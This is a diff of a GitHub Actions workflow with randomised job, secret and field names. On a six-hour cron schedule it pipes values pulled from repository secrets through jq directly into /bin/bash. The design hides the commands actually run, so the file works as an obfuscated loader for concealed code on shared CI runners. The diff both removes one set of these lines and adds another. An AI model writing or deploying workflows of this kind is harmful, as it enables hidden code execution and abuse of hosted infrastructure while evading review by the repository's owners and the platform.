@@ -1,25 +1,24 @@
 name: gutouru7465
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 2/6 * * *'
+    - cron: '7 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: gutouru7465
         env:
-          tvvvc2601: ${{ secrets.tvvvc2601 }}
+          ps767: ${{ secrets.ps767 }}
         run: |
-          echo $tvvvc2601 | jq -r .ujxp6302 | /bin/bash
-          echo $gqqti3100 | jq -r .yeho55569 | /bin/bash
-          echo $nsm9 | jq -r .x29 | /bin/bash
-          echo $dwi713 | jq -r .tgxz7303 | /bin/bash
-          echo $jy223 | jq -r .nxbu40666 | /bin/bash
-          echo $xjxa0 | jq -r .aikff432 | /bin/bash
-          echo $jnp1 | jq -r .m7909 | /bin/bash
-          echo $gmvjw87557 | jq -r .dosn308 | /bin/bash
-          echo $ma27 | jq -r .fthbf953 | /bin/bash
-          echo $jgt74 | jq -r .o4386 | /bin/bash
+          echo $ps767 | jq -r .hqxt139 | /bin/bash
+          echo $h46990 | jq -r .a2283 | /bin/bash
+          echo $vrit5304 | jq -r .gpyxi5551 | /bin/bash
+          echo $vmi74731 | jq -r .r6814 | /bin/bash
+          echo $abth4 | jq -r .d9 | /bin/bash
+          echo $e37288 | jq -r .svnme71901 | /bin/bash
 
